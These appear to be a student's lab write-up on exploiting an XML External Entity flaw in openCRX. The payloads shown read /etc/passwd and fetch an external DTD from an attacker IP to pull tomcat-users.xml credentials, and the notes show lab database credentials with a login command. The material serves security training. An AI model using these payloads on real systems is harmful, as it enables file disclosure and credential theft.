# XML External Entity (XXE)

Under `Wizards > Explore API`, we find a link to a Swagger page, a tool for documenting REST APIs after authentication. 

The API endpoints accept JSON and XML requests, and if the XML parser in insecurely configured, we may exploit it with an XML External Entity (XXE) attack.

## XML

XML encodes data to make it easier for humans and machines to read, similar to the layout of a HTML document.  

Applications relying on XML data make use of an XML **parser** that analyzes the markup code. XML processors can suffer from different types of vulnerabilities originating from malformed or malicious input data. XML parsing vulnerabilities can provide powerful primitives to an attacker, which could include information disclosure, SSRF or command injection. 

### Document Type Definitions (DTDs)

DTDs can be used to declare XML entities within an XML document, which is a data structure containing valid XML code that is referenced multiple times in a document (like a C++ macro).  

### Internal Entities

Internal entities are locally defined within the DTD, for instance `<!ENTITY test "<entity-value> test value </entity-value>">`. Entities do not have any **XML closing tags** and uses a special declaration with an exclamation mark. 

### External Entities

External entities are used when referencing data not defined locally and includes a URI from which the external data is retrieved. A **private** external entity is defined as `<!ENTITY test SYSTEM "http://test.com/test.xml">`, where the SYSTEM keyword indicates that a private external entity to be used by a single user or group of users. 

A **public** external entity is intended for a much wider audience and is defined as `<!ENTITY test PUBLIC "-//W3C//TEXT companyinfo//EN" "http://test.com/test.xml">`. Public entities specify a `public_id`, which is used by XML pre-processors to generate alternate URIs.  

### Parameter Entities

Parameter entities exist within a DTD but are otherwise similar to any other entities. Their definition syntax is `<!ENTITY % test 'Testing'>`, and is then referred to such `<!ENTITY title 'performing %test;'>`. Alternatively, their values can also be by declared with a URI. 

### Unparsed External Entities

XML entities do not have to contain valid XML code and can contain non-XML data as well. In those cases, we prevent the XML parser from processing the referenced data using the **NDATA** declaration. This works for both public and private external entities. `<!ENTITY name SYSTEM "uri" NDATA TYPE>`.

Unparsed entities allow us to access binary content, which can be important in web application environments that lack the same flexibility of PHP in IO stream manipulation. 

## XXE Processing Vulnerabilities

In a typical XXE injection, the attacker forces the XML parser to process one or more **external entities**. This results in the disclosure of confidential information not normally accessible by the application. The **main prerequisite** for the attack is the ability to feed a maliciously crafted XML request containing system identifiers that point to sensitive data to the target XML processor. This gives rise to many techniques that allow for data exfiltration 

- In some languages like PHP, XXE leads to RCE.
- In Java, we cannot execute code with just an XXE vulnerability

## Attack Vector

When an XML parser encounters an entity reference, it replaces the reference with the entity’s value. If we change the XML entity to an external entity and reference a file on the server, we’ll gain a file read functionality. 

```xml
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
```

A vulnerable parser will load the file contents and place them in the XML document, and in this case, reading the contents of `/etc/passwd` and placing that in the last name tag. If its contents are included in a server response, or we can retrieve the data in another way, we can use this vulnerability to read files on the server. Ideally, we want to inject the XXE payload into a field displayed in the web application. 

The Accounts page seems like a potential fit since the accounts API accepts XML input, and each account has multiple text fields displayed in the web application. While the API endpoint documentation is complicated (open the Wizards —> Explore API for each endpoint), we can find a sample HTTP request from [https://www.opencrx.org/opencrx/2.3/new.htm](https://www.opencrx.org/opencrx/2.3/new.htm)

```xml
	
<?xml version="1.0"?>
<org.opencrx.kernel.account1.Contact>
  <lastName>REST</lastName>
  <firstName>Test #1</firstName>
</org.opencrx.kernel.account1.Contact>
```

We’ll replace this with our payload and notice that the lastName field is now `replaced`

```xml
<?xml version="1.0"?>
<!DOCTYPE data[
<!ELEMENT data ANY>
<!ENTITY lastname "Replaced">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Test #1</firstName>
</org.opencrx.kernel.account1.Contact>
```

To get file read, we can use the following payload. This returns us the output from the file read. If instead we simply supply a file directory path (exercise 9.3.6.2), the output will return the directory listing instead. 

```xml
<?xml version="1.0"?>
<!DOCTYPE data[
<!ELEMENT data ANY>
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Test #1</firstName>
</org.opencrx.kernel.account1.Contact>
```

We also notice that the application attempted to insert it into a database in at least one field, resulting in an SQLexception. 

### Extra Mile 9.3.6.3

*Create a script to parse the results of the XXE attack and cleanly display the file contents.*

We can use a unique breakpoint string to sandwich our external entity to easily split the string and read our file contents.  

```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
<lastName>hhhhhbreakpoint&lastname;hhhhhbreakpoint</lastName>
<firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

## CDATA

XXE vulnerabilities can read simple files, however, we may encounter parser errors if we attempt to read XML files or files that contain key XML characters like `<>`.  As such, our XML content needs to be properly formatted after file contents are inserted, which should be done with **character escaping**. 

CDATA sections are XML sections in which internal contents are not treated as markup. If we wrap file contents in these tags, the parser will not treat it as markup and format it properly. 

```xml
<![CDATA["" content "]]>"
```

We can’t reference a single entity from within the DTD they are defined and need to use parameters referenced by the wrapper entity in an external DTD file. As such, we’ll define our wrapper DTD class in an external file and reference it from our injection.

```xml
wrapper.dtd file:
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
<!ENTITY % end "]]>">
<!ENTITY wrapper "%start;%file;%end;">

Injection XML:
<?xml version="1.0"?>
<!DOCTYPE data[
<!ENTITY % dtd SYSTEM "http://192.168.45.221/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
<lastName>hhhhhbreakpoint&wrapper;hhhhhbreakpoint</lastName>
<firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

We can thus obtain sensitive credentials in the `tomat-users.xml` file. 

```xml
<tomcat-users>  
<role rolename="OpenCrxAdministrator"/>
<role rolename="OpenCrxUser"/>
<role rolename="Guest"/>
<role rolename="OpenCrxRoot"/>
<role rolename="tomcat"/>
<role rolename="manager"/>
<user username="admin-Root" password="admin-Root" roles="OpenCrxRoot,manager"/>
<user username="tomcat" password="tomcat" roles="tomcat"/>
<user username="admin-Standard" password="admin-Standard" roles="OpenCrxAdministrator"/>  <user username="both" password="tomcat" roles="tomcat"/>
<user username="guest" password="guest" roles="OpenCrxUser,Guest"/>
</tomcat-users>
```

## HSQLDB

If we try to access the Tomcat Manager application, we find that the default configuration restricts access to localhost, making such a vector impossible. 

Instead, we can target the SQL database that the application references. Searching through the directories, we find several database-related files at `/home/student/crx/data/hsqldb`, which includes a file with credentials, `dbmanager.sh`, which contains the credentials `(sa, manager99)`. 

```bash
#!/bin/shexport 
JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64export 
PATH=/usr/lib/jvm/java-8-openjdk-amd64/jre/bin:$PATH
cd  /home/student/crx/data/hsqldb
java -cp ./hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://127.0.0.1:9001/CRX --user sa --password manager99
```

HSQLDB servers rely on ACLs or network layer protections to restrict access beyond usernames and passwords. The file [`crx.properties`](http://crx.properties) defines if any ACLs are defined within HSQLDB. In this case, none are defined. Checking with nmap, the port 9001 is open and thus we can use the above command to login to the database after downloading [hsqldb.jar](https://sourceforge.net/projects/hsqldb/files/hsqldb/hsqldb_2_7/) from the documentation. This opens a new GUI window. 

While HSQLDB does not have file writes like MySQL, custom procedures can call and invoke Java code. (Source: [9001 - Pentesting HSQLDB | HackTricks | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/9001-pentesting-hsqldb))